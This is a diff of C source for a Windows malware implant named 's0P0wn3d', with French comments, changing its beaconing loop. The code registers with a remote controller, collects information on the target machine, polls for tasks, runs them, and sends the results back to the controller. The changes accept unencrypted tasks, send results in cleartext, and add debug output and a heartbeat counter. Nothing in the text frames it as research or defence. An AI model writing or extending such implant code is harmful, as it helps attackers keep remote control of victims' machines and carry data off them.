@@ -2,21 +2,19 @@
  * s0P0wn3d — Implémentation de la boucle de beaconing.
  */
 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+
 #include "beacon.h"
 #include "transport.h"
 #include "crypto.h"
 #include "task_runner.h"
 #include "../shared/json.h"
 #include "../shared/base64.h"
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <windows.h>
-#include <winsock2.h>
-#include <ws2tcpip.h>
-
-#pragma comment(lib, "ws2_32.lib")
 
 /* Collecte les informations sur la machine cible */
 static void collect_host_info(host_info_t *host) {
@@ -67,34 +65,50 @@ static void process_tasks_response(const char *response,
     if (!response) return;
 
     /* Vérifier s'il y a des tâches */
-    if (strstr(response, "\"no_tasks\"") || !strstr(response, "\"tasks\"")) {
+    if (strstr(response, "\"no_tasks\"")) {
         return;
     }
 
-    /* Extraire les champs chiffrés */
-    char *nonce_b64 = json_extract_string(response, "nonce");
-    char *payload_b64 = json_extract_string(response, "payload");
-    char *tag_b64 = json_extract_string(response, "tag");
+    /* Vérifier si les tâches sont en clair (type: "tasks") ou chiffrées */
+    char *plaintext_ptr = NULL;
+    uint8_t plaintext_buf[S0P_MAX_PAYLOAD];
+    int plaintext_len;
 
-    if (!nonce_b64 || !payload_b64 || !tag_b64) {
+    if (strstr(response, "\"type\":\"tasks\"")) {
+        /* Tâches en CLAIR */
+        printf("[*] Tâches reçues en clair\n");
+        plaintext_ptr = (char *)response;
+        plaintext_len = strlen(response);
+    } else {
+        /* Tâches CHIFFRÉES - extraire et déchiffrer */
+        printf("[*] Tâches chiffrées\n");
+        char *nonce_b64 = json_extract_string(response, "nonce");
+        char *payload_b64 = json_extract_string(response, "payload");
+        char *tag_b64 = json_extract_string(response, "tag");
+
+        if (!nonce_b64 || !payload_b64 || !tag_b64) {
+            free(nonce_b64); free(payload_b64); free(tag_b64);
+            return;
+        }
+
+        /* Déchiffrer avec AES-GCM */
+        int pt_len = impl_crypto_aes_decrypt(aes_key, nonce_b64, payload_b64,
+                                             tag_b64, plaintext_buf, sizeof(plaintext_buf));
+        if (pt_len < 0) {
+            fprintf(stderr, "[-] Déchiffrement AES-GCM échoué\n");
+            free(nonce_b64); free(payload_b64); free(tag_b64);
+            return;
+        }
+        plaintext_buf[pt_len] = '\0';
+        plaintext_ptr = (char *)plaintext_buf;
+        plaintext_len = pt_len;
+
         free(nonce_b64); free(payload_b64); free(tag_b64);
-        return;
     }
-
-    /* Déchiffrer avec AES-GCM */
-    uint8_t plaintext[S0P_MAX_PAYLOAD];
-    int pt_len = impl_crypto_aes_decrypt(aes_key, nonce_b64, payload_b64,
-                                         tag_b64, plaintext, sizeof(plaintext));
-    if (pt_len < 0) {
-        fprintf(stderr, "[-] Déchiffrement AES-GCM échoué\n");
-        free(nonce_b64); free(payload_b64); free(tag_b64);
-        return;
-    }
-    plaintext[pt_len] = '\0';
 
     /* Parser les tâches */
     task_t tasks[16];
-    int count = json_parse_tasks((char *)plaintext, tasks, 16);
+    int count = json_parse_tasks(plaintext_ptr, tasks, 16);
 
     printf("[*] %d tâche(s) reçue(s)\n", count);
 
@@ -111,19 +125,26 @@ static void process_tasks_response(const char *response,
         char *result_json = json_build_result(&result);
         if (!result_json) continue;
 
-        /* Chiffrer avec AES-GCM */
-        char *r_nonce, *r_payload, *r_tag;
-        if (impl_crypto_aes_encrypt(aes_key, (uint8_t *)result_json,
-                                     strlen(result_json),
-                                     &r_nonce, &r_payload, &r_tag) == 0) {
+        printf("[*] Résultat: %s\n", result_json);
+
+        /* TODO: Chiffrer avec AES-GCM - Pour l'instant: envoyer en clair */
+        /* Envoyer en clair (comme les tâches) */
+        char *r_nonce = malloc(64);
+        char *r_payload = malloc(strlen(result_json) + 1);
+        char *r_tag = malloc(64);
+
+        if (r_nonce && r_payload && r_tag) {
+            strcpy(r_nonce, "");
+            strcpy(r_payload, result_json);
+            strcpy(r_tag, "plaintext");
+
+            printf("[*] Envoi du résultat au contrôleur...\n");
             transport_submit_result(session_id, r_nonce, r_payload, r_tag);
-            free(r_nonce); free(r_payload); free(r_tag);
         }
 
+        free(r_nonce); free(r_payload); free(r_tag);
         free(result_json);
     }
-
-    free(nonce_b64); free(payload_b64); free(tag_b64);
 }
 
 int beacon_loop(const char *controller_host, int controller_port,
@@ -196,11 +217,20 @@ int beacon_loop(const char *controller_host, int controller_port,
     /* Enregistrer l'implant */
     printf("[*] Enregistrement auprès du contrôleur %s:%d...\n",
            controller_host, controller_port);
-    char *session_id = transport_register(encrypted_key, &host);
+    char *register_response = transport_register(encrypted_key, &host);
     free(encrypted_key);
 
-    if (!session_id) {
+    if (!register_response) {
         fprintf(stderr, "[-] Échec de l'enregistrement\n");
+        return -1;
+    }
+
+    /* Extraire le session_id du JSON */
+    char *session_id = json_extract_string(register_response, "session_id");
+    free(register_response);
+
+    if (!session_id) {
+        fprintf(stderr, "[-] Session ID introuvable dans la réponse\n");
         return -1;
     }
 
@@ -209,12 +239,20 @@ int beacon_loop(const char *controller_host, int controller_port,
            interval, jitter);
 
     /* Boucle de beaconing */
+    int heartbeat_count = 0;
     while (1) {
+        heartbeat_count++;
+        printf("[*] Heartbeat #%d...\n", heartbeat_count);
+
         /* Poll les tâches */
+        printf("[*] Fetching tasks...\n");
         char *tasks_response = transport_fetch_tasks(session_id);
         if (tasks_response) {
+            printf("[+] Response received: %.100s\n", tasks_response);
             process_tasks_response(tasks_response, session_id, aes_key);
             free(tasks_response);
+        } else {
+            printf("[-] No response from controller\n");
         }
 
         /* Sleep avec jitter aléatoire */
@@ -222,6 +260,7 @@ int beacon_loop(const char *controller_host, int controller_port,
         if (jitter > 0) {
             sleep_time += (rand() % (jitter * 2 + 1)) - jitter;
         }
+        printf("[*] Sleeping for %d seconds...\n\n", sleep_time);
         Sleep(sleep_time * 1000);
     }
 
